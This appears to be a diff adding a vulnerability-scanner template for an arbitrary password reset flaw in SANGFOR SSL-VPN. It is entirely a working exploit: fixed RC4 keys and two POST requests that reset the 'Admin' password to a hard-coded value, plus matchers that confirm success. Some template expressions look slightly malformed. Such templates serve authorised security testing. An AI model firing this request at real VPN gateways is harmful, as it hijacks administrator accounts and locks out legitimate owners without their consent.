@@ -1,0 +1,50 @@
+id: sangfor-ssl-vpn-password-reset
+info:
+  name: SANGFOR SSL-VPN Arbitrary Password Reset Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SANGFOR SSL-VPN has an arbitrary user password reset vulnerability. The key parameters are encrypted with RC4 using fixed keys in specific versions. An attacker can exploit this vulnerability to reset the password of any user and gain the corresponding user rights.
+  reference:
+    - https://fofa.so
+
+variables:
+  rc4_key1: "20100720"
+  rc4_key2: "20181118"
+  username: "Admin"
+  password: "kissbyfire"
+
+http:
+  - raw:
+      - |
+        POST /por/changepwd.csp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sessReq=clusterd&sessid=0&str={{base64(rc4_encrypt(rc4_key1, concat(",username=", username, ",ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=", password)))}}&len={{len(base64(rc4_encrypt(rc4_key1, concat(",username=", username, ",ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=", password)))}}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Password reset successfully"
+      - type: regex
+        regex:
+          - "<title>.*Success.*</title>"
+
+  - raw:
+      - |
+        POST /por/changepwd.csp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sessReq=clusterd&sessid=0&str={{base64(rc4_encrypt(rc4_key2, concat(",username=", username, ",ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=", password)))}}&len={{len(base64(rc4_encrypt(rc4_key2, concat(",username=", username, ",ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=", password)))}}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Password reset successfully"
+      - type: regex
+        regex:
+          - "<title>.*Success.*</title>"
